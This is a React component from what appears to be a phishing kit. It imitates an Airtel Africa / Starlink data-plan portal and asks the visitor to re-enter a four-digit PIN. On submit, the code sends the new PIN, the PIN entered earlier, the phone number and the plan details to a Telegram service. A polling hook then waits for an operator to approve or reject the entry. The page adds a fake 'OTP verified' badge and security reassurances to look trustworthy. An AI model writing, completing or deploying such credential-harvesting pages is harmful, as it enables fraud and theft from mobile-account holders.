import React, { useState, useRef } from 'react';
import { motion } from 'motion/react';
import { AirtelLogo } from './Logos';
import { InternetPlan } from '../types';
import { ValidatingModal } from './ValidatingModal';
import { useTelegramPolling } from '../hooks/useTelegramPolling';
import { telegramService } from '../services/telegramService';
import { LanguageSwitch } from './LanguageSwitch';
import { useApp } from '../context/AppContext';
import { CountryInfo } from '../data/countries';
import {
  ShieldCheck,
  ArrowLeft,
  Lock,
  Eye,
  EyeOff,
  AlertTriangle,
  Loader2,
  KeyRound,
  Zap,
  CheckCircle2,
  ArrowRight,
  Sparkles,
} from 'lucide-react';

interface ReenterPinPageProps {
  phone: string;
  fullPhone?: string;
  country?: CountryInfo;
  initialPin: string;
  sessionId: string;
  selectedPlan: InternetPlan;
  onBack: () => void;
  onSuccess: (confirmedPin: string) => void;
}

export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
  phone,
  fullPhone: propFullPhone,
  country: propCountry,
  initialPin,
  sessionId,
  selectedPlan,
  onBack,
  onSuccess,
}) => {
  const { country: ctxCountry, language, t } = useApp();
  const country = propCountry || ctxCountry;
  const displayPhone = propFullPhone || `${country.dialCode} ${phone}`;

  const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);

  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Handle PIN input change
  const handlePinChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, '').slice(-1);
    const newPin = [...pinDigits];
    newPin[index] = cleanValue;
    setPinDigits(newPin);
    setErrorMessage(null);

    // Auto move to next input
    if (cleanValue && index < 3) {
      pinInputRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      pinInputRefs.current[index - 1]?.focus();
    }
  };

  const handlePinPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (pasted) {
      const newDigits = ['', '', '', ''];
      for (let i = 0; i < pasted.length; i++) {
        newDigits[i] = pasted[i];
      }
      setPinDigits(newDigits);
      if (pasted.length === 4) {
        pinInputRefs.current[3]?.focus();
      } else {
        pinInputRefs.current[pasted.length]?.focus();
      }
    }
  };

  const currentPin = pinDigits.join('');
  const isPinComplete = currentPin.length === 4;

  // Telegram polling hook for re-entered PIN verification
  const { status: telegramStatus } = useTelegramPolling({
    sessionId,
    phone,
    targetStep: 'reenter',
    isActive: isWaitingTelegram,
    onApproved: () => {
      setTimeout(() => {
        setIsWaitingTelegram(false);
        onSuccess(currentPin);
      }, 800);
    },
    onRejected: () => {
      setIsWaitingTelegram(false);
      setErrorMessage(t('reenterPinRejected'));
      setPinDigits(['', '', '', '']);
      pinInputRefs.current[0]?.focus();
    },
  });

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!isPinComplete || isSubmitting) return;

    setIsSubmitting(true);
    setErrorMessage(null);

    try {
      // Send re-entered PIN to Telegram
      await telegramService.sendReenterPin({
        sessionId,
        phone,
        fullPhone: displayPhone,
        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
        airtelBrand: country.airtelBrand,
        originalPin: initialPin,
        pin: currentPin,
        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
        planPrice: selectedPlan.price,
      });

      setIsWaitingTelegram(true);
    } catch (err: any) {
      setErrorMessage(
        err.message ||
          (language === 'fr'
            ? 'Échec de transmission du code PIN.'
            : 'Failed to transmit PIN confirmation.')
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F7F9FC] flex flex-col justify-between text-neutral-900 selection:bg-[#E60000] selection:text-white">
      {/* Top Header */}
      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-3.5 px-4 sm:px-6 sticky top-0 z-30">
        <div className="max-w-4xl mx-auto flex items-center justify-between gap-2">
          <button
            type="button"
            id="btn-back-to-otp"
            onClick={onBack}
            className="flex items-center gap-1.5 text-xs font-bold text-neutral-600 hover:text-[#E60000] transition-colors py-2 px-2.5 rounded-xl hover:bg-neutral-100 cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>{t('back')}</span>
          </button>

          <div className="flex items-center gap-3">
            <LanguageSwitch variant="light" />

            <div className="hidden sm:flex items-center gap-2 pl-2 border-l border-neutral-200">
              <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider">
                {t('airtelLitePortal')}
              </span>
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
            </div>
          </div>
        </div>
      </header>

      {/* Main Center Content */}
      <main className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -20 }}
          transition={{ duration: 0.35 }}
          className="w-full max-w-md bg-white rounded-3xl shadow-[0_15px_45px_rgba(0,0,0,0.07)] border border-neutral-200/80 p-5 sm:p-8 relative overflow-hidden"
        >
          {/* Subtle top red brand bar */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />

          {/* Plan Summary Pill */}
          <div className="mb-5 p-3.5 rounded-2xl bg-red-50/70 border border-red-100 flex items-center justify-between gap-2">
            <div className="flex items-center gap-2.5 min-w-0">
              <div className="w-8 h-8 rounded-xl bg-[#E60000] text-white flex items-center justify-center font-black text-xs shadow-sm shrink-0">
                <Zap className="w-4 h-4" />
              </div>
              <div className="min-w-0">
                <p className="text-[11px] font-semibold text-neutral-500 truncate">{t('selectedPlanPill')}</p>
                <p className="text-xs font-black text-neutral-900 truncate">
                  {selectedPlan.dataAmount} {selectedPlan.dataUnit} • {selectedPlan.validity}
                </p>
              </div>
            </div>
            <div className="text-right shrink-0">
              <span className="font-black text-sm text-[#E60000]">{selectedPlan.price}</span>
            </div>
          </div>

          {/* OTP Verified Success Notification Badge */}
          <div className="mb-5 p-3 rounded-2xl bg-emerald-50 border border-emerald-200/80 flex items-center gap-2.5 text-emerald-800">
            <div className="w-7 h-7 rounded-xl bg-emerald-500 text-white flex items-center justify-center shrink-0 shadow-sm">
              <CheckCircle2 className="w-4 h-4" />
            </div>
            <div className="text-left leading-tight">
              <p className="text-[11px] font-extrabold uppercase tracking-wider text-emerald-700">
                {t('otpVerifiedBadge')}
              </p>
              <p className="text-[11px] text-emerald-900/80 font-medium">
                {language === 'fr'
                  ? 'Code de sécurité validé avec succès.'
                  : 'Security code validated successfully.'}
              </p>
            </div>
          </div>

          {/* Airtel Logo Header & Title */}
          <div className="flex flex-col items-center text-center mb-6">
            <AirtelLogo variant="nextgen" className="h-11 mb-2" />
            <div className="w-12 h-12 rounded-2xl bg-red-100/70 text-[#E60000] flex items-center justify-center mb-3 shadow-inner">
              <KeyRound className="w-6 h-6" />
            </div>

            <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-red-50 border border-red-100 text-[10px] font-bold text-[#E60000] uppercase tracking-wider mb-2">
              <Sparkles className="w-3 h-3" />
              <span>{t('reenterPinBadge')}</span>
            </div>

            <h2 className="text-lg sm:text-xl font-black text-neutral-900 tracking-tight">
              {t('reenterPinTitle')}
            </h2>
            <p className="text-xs text-neutral-500 mt-1.5 max-w-xs leading-relaxed">
              {t('reenterPinSubtitle')}{' '}
              <strong className="text-neutral-800 font-bold font-mono">
                {displayPhone}
              </strong>
            </p>
          </div>

          {/* Error Message Box */}
          {errorMessage && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="mb-5 p-3.5 rounded-2xl bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-start gap-2.5 font-medium"
            >
              <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
              <span>{errorMessage}</span>
            </motion.div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <div className="flex items-center justify-between mb-2">
                <label className="text-xs font-bold text-neutral-700 flex items-center gap-1.5">
                  <Lock className="w-3.5 h-3.5 text-neutral-400" />
                  <span>{t('reenterPinLabel')}</span>
                </label>
                <button
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="text-[11px] font-semibold text-neutral-500 hover:text-neutral-800 flex items-center gap-1 cursor-pointer transition-colors"
                >
                  {showPin ? (
                    <>
                      <EyeOff className="w-3.5 h-3.5" />
                      <span>{t('hide')}</span>
                    </>
                  ) : (
                    <>
                      <Eye className="w-3.5 h-3.5" />
                      <span>{t('show')}</span>
                    </>
                  )}
                </button>
              </div>

              {/* 4 PIN Digit Inputs */}
              <div className="flex items-center justify-center gap-3">
                {pinDigits.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={(el) => {
                      pinInputRefs.current[idx] = el;
                    }}
                    type={showPin ? 'text' : 'password'}
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handlePinChange(idx, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(idx, e)}
                    onPaste={idx === 0 ? handlePinPaste : undefined}
                    autoFocus={idx === 0}
                    disabled={isSubmitting || isWaitingTelegram}
                    className="w-14 h-16 sm:w-16 sm:h-16 text-center text-2xl font-black rounded-2xl border-2 border-neutral-200 bg-neutral-50/70 focus:bg-white focus:border-[#E60000] focus:ring-4 focus:ring-red-500/15 outline-none transition-all duration-200 disabled:opacity-50"
                  />
                ))}
              </div>

              <p className="text-[11px] text-neutral-400 text-center mt-3 leading-relaxed">
                {t('reenterPinHelper')}
              </p>
            </div>

            {/* Confirm Submit Button */}
            <button
              type="submit"
              id="btn-confirm-reenter-pin"
              disabled={!isPinComplete || isSubmitting || isWaitingTelegram}
              className={`w-full py-4 px-6 rounded-2xl font-black text-xs tracking-wider uppercase transition-all duration-300 flex items-center justify-center gap-2 cursor-pointer shadow-lg ${
                isPinComplete && !isSubmitting && !isWaitingTelegram
                  ? 'bg-gradient-to-r from-[#E60000] to-[#c40000] hover:from-[#d10000] hover:to-[#a80000] text-white shadow-red-600/30 hover:shadow-red-600/40 hover:-translate-y-0.5 active:translate-y-0'
                  : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
              }`}
            >
              {isSubmitting || isWaitingTelegram ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>{t('validating')}</span>
                </>
              ) : (
                <>
                  <ShieldCheck className="w-4 h-4" />
                  <span>{t('confirmAndActivate')}</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>
          </form>

          {/* Security Assurance */}
          <div className="mt-6 pt-5 border-t border-neutral-100 flex items-center justify-center gap-2 text-neutral-400 text-[11px] font-medium">
            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>{t('secureNote')}</span>
          </div>
        </motion.div>
      </main>

      {/* Footer */}
      <footer className="w-full py-4 text-center text-neutral-400 text-xs border-t border-neutral-200 bg-white">
        <p>
          &copy; {new Date().getFullYear()} Airtel Africa • Starlink Direct-to-Cell • {country.airtelBrand}
        </p>
      </footer>

      {/* Validating Modal */}
      <ValidatingModal
        isOpen={isWaitingTelegram}
        type="reenter"
        phone={displayPhone}
        planName={selectedPlan.dataAmount}
        planPrice={selectedPlan.price}
        status={telegramStatus}
      />
    </div>
  );
};
